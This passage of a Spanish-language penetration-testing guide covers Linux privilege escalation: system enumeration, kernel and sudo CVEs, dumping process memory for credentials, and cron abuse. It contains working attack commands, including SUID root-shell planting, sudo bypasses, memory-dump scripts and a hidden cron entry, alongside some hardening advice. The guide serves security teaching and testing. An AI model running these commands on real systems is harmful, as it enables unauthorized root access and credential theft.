# Escalada de privilegios en Linux

{{#include ../../../banners/hacktricks-training.md}}

Para conocer mejor el contexto y los flujos históricos de enumeración, consulta los recursos g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation y linux-private-i que aparecen en las referencias.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Información del sistema

### Información del SO

Empecemos recopilando información sobre el SO en ejecución.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Ruta

Si **tienes permisos de escritura en alguna carpeta incluida en la variable `PATH`**, es posible que puedas secuestrar algunas bibliotecas o binarios:

```bash
echo $PATH
```

### Información del entorno

¿Hay información interesante, contraseñas o claves API en las variables de entorno?

```bash
(env || set) 2>/dev/null
```

### Kernel exploits

Comprueba la versión del kernel y si hay algún exploit que se pueda usar para escalar privilegios.

La [sección Kernel/LPE/CVE](../../main-system-information/kernel-lpe-cves/README.md) recopila casos de escalada local y enlaces a análisis más detallados del kernel de Linux en Binary Exploitation. Verifica la compilación y la configuración afectadas antes de probar un caso práctico.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

Puedes encontrar una buena lista de kernels vulnerables y algunos **exploits compilados** aquí: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) y [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Otros sitios donde puedes encontrar **exploits compilados**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Para extraer todas las versiones del kernel vulnerables de esa web, puedes hacer lo siguiente:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Herramientas que pueden ayudar a buscar exploits del kernel:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (ejecutar EN la víctima, solo comprueba exploits para el kernel 2.x)

Busca siempre **la versión del kernel en Google**; puede que la versión de tu kernel aparezca en algún exploit del kernel y así tendrás la certeza de que ese exploit es válido.

Técnicas adicionales de explotación del kernel:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Escalada de privilegios en Linux - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Versión de Sudo

Según las versiones vulnerables de sudo que aparecen en:

```bash
searchsploit sudo
```

Puedes comprobar si la versión de sudo es vulnerable usando este grep.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Upstream sudo **1.9.14 through 1.9.17** permite que usuarios locales sin privilegios escalen a root mediante la opción `--chroot` cuando sudo carga `/etc/nsswitch.conf` desde un directorio controlado por el usuario; upstream corrigió esto en **1.9.17p1**. Comprueba todos los binarios sudo ejecutables con setuid de root en las rutas pertinentes, ya que `sudo -V` solo informa sobre el binario seleccionado mediante `PATH`. Los paquetes de las distribuciones pueden incluir la corrección sin cambiar la cadena de versión upstream, así que verifica también el estado del paquete del proveedor. Consulta el [aviso del mantenedor de sudo](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>

Aquí tienes un [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) para explotar esa [vulnerabilidad](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Antes de ejecutar el exploit, asegúrate de que tu versión de `sudo` sea vulnerable y admita la función `chroot`.

Para obtener más información, consulta el [aviso original de la vulnerabilidad](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Omisión de reglas de sudo basadas en el host (CVE-2025-32462)

Upstream sudo **1.8.8 through 1.9.17** puede evaluar las reglas de sudoers basadas en el host usando el **nombre de host proporcionado por el usuario** mediante `sudo -h <host>` en lugar del **nombre de host real**; upstream corrigió esto en **1.9.17p1**. El usuario aún debe tener una entrada de sudoers coincidente en el host seleccionado. Revisa también las correcciones retroportadas por el proveedor y los binarios sudo alternativos, además de la política local. Consulta el [aviso del mantenedor de sudo](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>

Requisitos:
- Versión vulnerable de sudo
- Reglas de sudoers específicas del host (el host no es ni el nombre de host actual ni `ALL`)

Ejemplo de patrón de sudoers:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

Exploit mediante spoofing del host permitido:

```bash
sudo -h devbox id
sudo -h devbox -i
```

Si la resolución del nombre seleccionado se bloquea, verifica cómo se resuelve ese nombre en el host. Ver un nombre en un registro o archivo de configuración no significa que se pueda resolver, y modificar `/etc/hosts` normalmente requiere permisos de escritura privilegiados.

#### sudo < v1.8.28

Este [upstream Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287) requiere una regla efectiva de sudo que permita ejecutar un comando como cualquier usuario, excepto root, por ejemplo `(ALL, !root) /bin/bash`. El usuario que invoca el comando también debe tener permiso para usar esa regla, incluidos los requisitos de autenticación. Consulta el aviso del paquete instalado: los proveedores retroportaron la corrección a versiones cuya versión upstream mostrada sigue siendo inferior a 1.8.28. Una regla `!root` o una versión antigua, por sí solas, no confirman que el sistema sea vulnerable. No pruebes un comando privilegiado durante la enumeración pasiva.

```
sudo -u#-1 /bin/bash
```

### Falló la verificación de la firma de Dmesg

Consulta la **máquina smasher2 de HTB** para ver un **ejemplo** de cómo se podría explotar esta vulnerabilidad.

```bash
dmesg 2>/dev/null | grep "signature"
```

### Más enumeración del sistema

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Enumerar las posibles defensas

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

Si estás dentro de un contenedor, empieza por la siguiente sección sobre seguridad de contenedores y luego pasa a las páginas sobre abuso específicas del runtime:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Unidades

Comprueba **qué está montado y desmontado**, dónde y por qué. Si algo está desmontado, podrías intentar montarlo y buscar información privada.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Software útil

Enumera los binarios útiles

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Además, comprueba si **hay algún compilador instalado**. Esto es útil si necesitas usar algún exploit del kernel, ya que se recomienda compilarlo en la máquina donde vas a usarlo (o en una similar).

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Software vulnerable instalado

Comprueba la **versión de los paquetes y servicios instalados**. Quizá haya una versión antigua de Nagios (por ejemplo) que se pueda explotar para escalar privilegios…\
Se recomienda comprobar manualmente la versión del software instalado más sospechoso.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

Si tienes acceso SSH a la máquina, también podrías usar **openVAS** para comprobar si hay software obsoleto y vulnerable instalado en ella.

> [!NOTE] > _Ten en cuenta que estos comandos mostrarán mucha información que en su mayoría será inútil. Por lo tanto, se recomienda usar aplicaciones como OpenVAS o similares para comprobar si alguna versión del software instalado es vulnerable a exploits conocidos._

## Processes

Echa un vistazo a **qué procesos** se están ejecutando y comprueba si alguno tiene **más privilegios de los que debería** (¿quizá un tomcat ejecutado por root?).

```bash
ps aux
ps -ef
top -n 1
```

Comprueba siempre si hay [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md) en ejecución; podrías abusar de ellos para escalar privilegios. **Linpeas** los detecta buscando el parámetro `--inspect` en la línea de comandos del proceso.\
Comprueba también **tus privilegios sobre los binarios de los procesos**; quizá puedas sobrescribir alguno.

### Cadenas padre-hijo entre usuarios

Que un proceso hijo se ejecute con un **usuario diferente** al de su proceso padre no es automáticamente malicioso, pero es una **señal útil para el triage**. Algunas transiciones son esperables (`root` inicia un servicio con otro usuario, los gestores de inicio de sesión crean procesos de sesión), pero las cadenas inusuales pueden revelar wrappers, debug helpers, persistencia o límites de confianza débiles en tiempo de ejecución.

Revisión rápida:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Si encuentras una cadena sorprendente, inspecciona la línea de comandos del proceso padre y todos los archivos que afectan su comportamiento (`config`, `EnvironmentFile`, scripts auxiliares, directorio de trabajo, argumentos modificables). En varias rutas reales de privesc, el proceso hijo no se podía modificar, pero sí la **configuración controlada por el proceso padre** o la cadena de scripts auxiliares.

### Ejecutables eliminados y archivos abiertos eliminados

Los artefactos de ejecución suelen seguir siendo accesibles **después de eliminarlos**. Esto es útil tanto para la escalada de privilegios como para recuperar pruebas de un proceso que ya tiene archivos sensibles abiertos.

Comprueba si hay ejecutables eliminados:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

Si `/proc/<PID>/exe` apunta a `(deleted)`, el proceso sigue ejecutando la imagen binaria antigua desde la memoria. Es una señal clara para investigar porque:

- el ejecutable eliminado puede contener cadenas o credenciales interesantes
- el proceso en ejecución puede seguir exponiendo descriptores de archivo útiles
- un binario privilegiado eliminado puede indicar manipulación reciente o un intento de limpieza

Recopila globalmente los archivos eliminados que siguen abiertos:

```bash
lsof +L1
```

Si encuentras un descriptor interesante, recupéralo directamente:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Esto es especialmente valioso cuando un proceso todavía tiene abierto un secreto eliminado, un script, una exportación de base de datos o un archivo flag.

### Monitorización de procesos

Puedes usar herramientas como [**pspy**](https://github.com/DominicBreuker/pspy) para monitorizar procesos. Esto puede ser muy útil para identificar procesos vulnerables que se ejecutan con frecuencia o cuando se cumplen ciertos requisitos.

#### ProcMon de Linux con sudo

[ProcMon para Linux](https://github.com/microsoft/ProcMon-for-Linux) puede rastrear procesos y llamadas al sistema seleccionados y guardar una traza de SQLite. Si `sudo -l` permite ejecutar un comando `procmon` sin restricciones y con capacidad de root, considera si podría observar la entrada o salida de los procesos de otro usuario. Este permiso solo es una pista para investigar: también importan el soporte del tracer, la política efectiva y la actividad de un proceso adecuado. Los archivos de traza pueden contener secretos, así que inspecciona cuidadosamente las exportaciones autorizadas y evita recopilar datos de procesos no relacionados.

### Memoria de procesos

Algunos servicios de un servidor guardan **credenciales en texto plano dentro de la memoria**.\
Normalmente necesitarás **privilegios de root** para leer la memoria de procesos que pertenecen a otros usuarios, por lo que esto suele ser más útil cuando ya eres root y quieres descubrir más credenciales.\
Sin embargo, recuerda que **como usuario normal puedes leer la memoria de los procesos que te pertenecen**.

> [!WARNING]
> Ten en cuenta que hoy en día la mayoría de las máquinas **no permiten ptrace de forma predeterminada**, lo que significa que no puedes volcar otros procesos que pertenezcan a tu usuario sin privilegios.
>
> El archivo _**/proc/sys/kernel/yama/ptrace_scope**_ controla la accesibilidad de ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: se pueden depurar todos los procesos, siempre que tengan el mismo uid. Esta es la forma clásica en que funcionaba ptrace.
> - **kernel.yama.ptrace_scope = 1**: solo se puede depurar un proceso padre.
> - **kernel.yama.ptrace_scope = 2**: solo un administrador puede usar ptrace, ya que requiere la capacidad CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: no se puede rastrear ningún proceso con ptrace. Una vez establecido, es necesario reiniciar para volver a habilitar ptrace.

Un proceso con el mismo UID que desbloquea brevemente una bóveda de contraseñas puede constituir un límite de credenciales independiente. Cuando se permite el tracing, un proceso activo y volcadable puede exponer la contraseña de la bóveda mediante sus llamadas al sistema de entrada o su memoria, aunque el archivo de la bóveda cifrada siga protegido. `ptrace_scope=0` es solo un requisito previo: también importan que las credenciales coincidan, que el proceso de destino permita volcados, otros módulos de seguridad de Linux y la duración del proceso. Que una entrada de la bóveda sirva para iniciar sesión como root en Unix requiere una comprobación independiente de reutilización de credenciales. La enumeración rutinaria debería indicar la política y las rutas de procesos o bóvedas candidatos, sin capturar entradas ni mostrar secretos. Consulta la [documentación de Yama del kernel](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) y las [comprobaciones de acceso de ptrace](https://man7.org/linux/man-pages/man2/ptrace.2.html).

#### GDB

Si tienes acceso a la memoria de un servicio FTP, por ejemplo, podrías obtener el Heap y buscar sus credenciales.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### Script de GDB

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Para un ID de proceso determinado, **maps muestra cómo se asigna la memoria dentro del espacio de direcciones virtuales de ese proceso**; también muestra los **permisos de cada región asignada**. El archivo pseudo **mem expone la memoria del proceso**. A partir del archivo **maps**, sabemos qué **regiones de memoria son legibles** y cuáles son sus offsets. Usamos esta información para **buscar en el archivo mem y volcar todas las regiones legibles** en un archivo.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` permite acceder a la memoria **física** del sistema, no a la memoria virtual. Se puede acceder al espacio de direcciones virtuales del kernel mediante /dev/kmem.\
Normalmente, solo **root** y el grupo **kmem** pueden leer `/dev/mem`.

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump para Linux

ProcDump es una reinterpretación para Linux de la clásica herramienta ProcDump de la suite de herramientas Sysinternals para Windows. Consíguela en [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Herramientas

Para volcar la memoria de un proceso, puedes usar:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Puedes eliminar manualmente los requisitos de root y volcar el proceso que te pertenece
- Script A.5 de [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (se requiere root)

### Credenciales de la memoria del proceso

#### Ejemplo manual

Si descubres que el proceso authenticator está en ejecución:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Puedes hacer un dump del proceso (consulta las secciones anteriores para encontrar distintas formas de hacer un dump de la memoria de un proceso) y buscar credenciales en la memoria:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

La herramienta [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **robará credenciales en texto claro de la memoria** y de algunos **archivos conocidos**. Requiere privilegios de root para funcionar correctamente.

| Función                                           | Nombre del proceso   |
| ------------------------------------------------- | -------------------- |
| Contraseña de GDM (Kali Desktop, Debian Desktop)  | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (conexiones FTP activas)                   | vsftpd               |
| Apache2 (sesiones activas de autenticación HTTP básica) | apache2              |
| OpenSSH (sesiones SSH activas: uso de sudo)       | sshd:                |

#### Regex de búsqueda/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Trabajos programados/Cron

### Crontab UI (alseambusher) ejecutándose como root: escalada de privilegios mediante un scheduler web

Si un panel web “Crontab UI” (alseambusher/crontab-ui) se ejecuta como root y solo está enlazado a loopback, puedes acceder de todas formas mediante port-forwarding local por SSH y crear un trabajo privilegiado para escalar privilegios.<sup>[[1]](#references)[[4]](#references)</sup>

Cadena típica
- Detectar un puerto accesible solo desde loopback (p. ej., 127.0.0.1:8000) y el realm de Basic-Auth mediante `ss -ntlp` / `curl -v localhost:8000`
- Buscar credenciales en artefactos operativos:
  - Backups/scripts con `zip -P <password>`
  - Unidad de systemd que exponga `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Crear el túnel e iniciar sesión:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Crea un job con privilegios elevados y ejecútalo inmediatamente (deja una shell SUID):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Úsalo:
```bash
/tmp/rootshell -p   # root shell
```

Endurecimiento
- No ejecutes Crontab UI como root; limítalo a un usuario dedicado y permisos mínimos
- Vincúlalo a localhost y restringe el acceso también mediante firewall/VPN; no reutilices contraseñas
- Evita incluir secretos en los archivos de unidad; usa almacenes de secretos o un EnvironmentFile accesible solo por root
- Habilita la auditoría y el registro de ejecuciones de tareas bajo demanda

Comprueba si alguna tarea programada es vulnerable. Quizá puedas aprovecharte de un script que se ejecuta como root (¿vulnerabilidad de comodines? ¿Puedes modificar archivos que usa root? ¿Usar symlinks? ¿Crear archivos específicos en el directorio que usa root?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

Si se usa `run-parts`, comprueba qué nombres se ejecutarán realmente:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

Esto evita falsos positivos. Un directorio periódico con permisos de escritura solo es útil si el nombre de archivo de tu payload coincide con las reglas locales de `run-parts`.

### Ruta de Cron

Por ejemplo, dentro de _/etc/crontab_ puedes encontrar el PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Observa que el usuario "user" tiene permisos de escritura sobre /home/user_)

Si en este crontab el usuario root intenta ejecutar algún comando o script sin establecer la ruta. Por ejemplo: _\* \* \* \* root overwrite.sh_\
Entonces, puedes obtener una shell de root usando:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron usando un script con un comodín (Wildcard Injection)

Si root ejecuta un script que contiene un «**\***» dentro de un comando, podrías aprovecharlo para provocar efectos inesperados (como una escalada de privilegios). Ejemplo:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Si el comodín está precedido por una ruta como** _**/some/path/\***_ **, no es vulnerable (ni siquiera** _**./\***_ **lo es).**

Lee la siguiente página para conocer más trucos de explotación de comodines:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Inyección mediante expansión aritmética de Bash en analizadores de registros de cron

Bash puede interpretar texto no confiable como una expresión aritmética. En ciertos contextos de Bash, un subíndice de array dentro de esa expresión puede evaluar una sustitución de comandos. Si un analizador privilegiado de cron introduce texto de registro controlado por un atacante en una comparación aritmética, la sustitución puede ejecutarse con la identidad del analizador.<sup>[[22]](#references)</sup> Esto depende de la expresión exacta de Bash y de la versión; una cadena simple `$(...)0` en una variable expandida no demuestra por sí sola que se vuelva a evaluar de forma fiable.

La entrada también puede provenir de metadatos de archivos o de otro campo leído desde una ubicación en la que un usuario pueda escribir. Por ejemplo, un script de limpieza privilegiado que lee la etiqueta `Producer` de una imagen y la compara mediante `[[ "$producer" -eq "expected" ]]` realiza una comparación aritmética, aunque la variable esté entre comillas. Comprueba la identidad con la que se ejecuta la tarea programada, qué archivos pueden proporcionar la etiqueta, las transformaciones aplicadas antes de la comparación y el comportamiento exacto de Bash. Para etiquetas de texto, usa una comparación de cadenas; para números, valida que la entrada contenga solo dígitos decimales antes de hacer operaciones aritméticas. Consulta las [reglas de aritmética de Bash](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).

- Patrón vulnerable habitual:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Sondeo seguro del comportamiento local del mecanismo de subíndice de array (sin proceso privilegiado ni cambios en archivos):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Rastrea el script programado real y la ruta literal de entrada que abre. Aunque el archivo de log no tenga permisos de escritura, un usuario que pueda escribir en su directorio padre y recorrerlo podría reemplazar su entrada de directorio si no tiene el sticky bit; `namei -l` ayuda a distinguir esos permisos. Una ruta de log distinta que sí permita escritura, un scheduler ilegible o un parser que nunca evalúe ese campo como aritmética de Bash no demuestran que esta vía sea posible.

### Sobrescritura de script de cron y symlink

Si **puedes modificar un script de cron** ejecutado por root, puedes obtener una shell fácilmente:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Si el script ejecutado por root utiliza un **directorio al que tienes acceso completo**, quizá te resulte útil eliminar esa carpeta y **crear un symlink a otra carpeta** que contenga un script controlado por ti.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Validación de enlaces simbólicos y manejo más seguro de archivos

Al revisar scripts/binarios privilegiados que leen o escriben archivos mediante una ruta, verifica cómo se manejan los enlaces:

- `stat()` sigue un enlace simbólico y devuelve los metadatos del destino.
- `lstat()` devuelve los metadatos del propio enlace.
- `readlink -f` y `namei -l` ayudan a resolver el destino final y muestran los permisos de cada componente de la ruta.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Para defensores/desarrolladores, algunos patrones más seguros contra trucos con symlinks incluyen:

- `O_EXCL` con `O_CREAT`: falla si la ruta ya existe (bloquea links/archivos creados previamente por un atacante).
- `openat()`: opera en relación con un descriptor de archivo de un directorio de confianza.
- `mkstemp()`: crea archivos temporales de forma atómica y con permisos seguros.

### Binarios de cron firmados de forma personalizada con payloads escribibles
Un usuario normal que pueda escribir el binario exacto que ejecuta un trabajo de cron de root puede cruzar un límite de privilegios, pero una comprobación de firma personalizada puede rechazar un reemplazo sin firmar. En el caso documentado, el ELF propiedad de root tenía el modo `0760`, lo que permitía a un miembro de su grupo escribirlo, mientras que el propietario root podía ejecutarlo. Un seguimiento visible de procesos mostró que `objcopy` extraía `.text_sig` antes de que el trabajo ejecutara el binario; el script completo del verificador no se podía leer.<sup>[[2]](#references)</sup>

El reemplazo que tuvo éxito se firmó con material de firma privado filtrado mediante un firmador ELF. La [documentación del formato](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) describe una sección de firma derivada del `.text` del ejecutable. No se demuestra que añadir únicamente un certificado o una cadena coincidente a `.text_sig` satisfaga el verificador, cuyo funcionamiento no se conoce. Comprueba la ruta programada real, los permisos de escritura efectivos, la invocación de root y la política del verificador antes de concluir que un binario firmado y escribible es explotable. Una sección `.text_sig` por sí sola es solo una pista para revisar.

### Trabajos cron frecuentes

Puedes monitorizar los procesos para buscar los que se ejecutan cada 1, 2 o 5 minutos. Quizá puedas aprovecharlo para escalar privilegios.

Por ejemplo, para **monitorizar cada 0.1s durante 1 minuto**, **ordenar de menor a mayor cantidad de ejecuciones y eliminar los comandos que más se hayan ejecutado**, puedes hacer:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**También puedes usar** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (monitorizará y listará cada proceso que se inicie).

### Backups de root que preservan los bits de modo establecidos por el atacante (pg_basebackup)

Si un cron propiedad de root ejecuta `pg_basebackup` (o cualquier copia recursiva) sobre un directorio de base de datos en el que puedes escribir, puedes colocar un **binario SUID/SGID** que se volverá a copiar como **root:root** con los mismos bits de modo en el destino del backup.<sup>[[26]](#references)</sup>

Flujo típico de reconocimiento (como usuario de DB con pocos privilegios):
- Usa `pspy` para detectar un cron de root que ejecute algo como `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` cada minuto.
- Confirma que puedes escribir en el clúster de origen (p. ej., `/var/lib/postgresql/14/main`) y que el destino (`/opt/backups/current`) pasa a ser propiedad de root después de la tarea.

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Esto funciona porque `pg_basebackup` conserva los bits de modo de archivo al copiar el clúster; cuando lo invoca root, los archivos de destino heredan **la propiedad de root + los bits SUID/SGID elegidos por el atacante**. Cualquier rutina similar de copia o backup con privilegios que conserve los permisos y escriba en una ubicación ejecutable es vulnerable.

### Trabajos cron invisibles

Es posible crear un cronjob **poniendo un retorno de carro después de un comentario** (sin carácter de salto de línea), y el trabajo cron funcionará. Ejemplo (observa el carácter de retorno de carro):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Para detectar este tipo de entrada sigilosa, inspecciona los archivos cron con herramientas que muestren los caracteres de control:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Servicios

### Archivos _.service_ con permisos de escritura

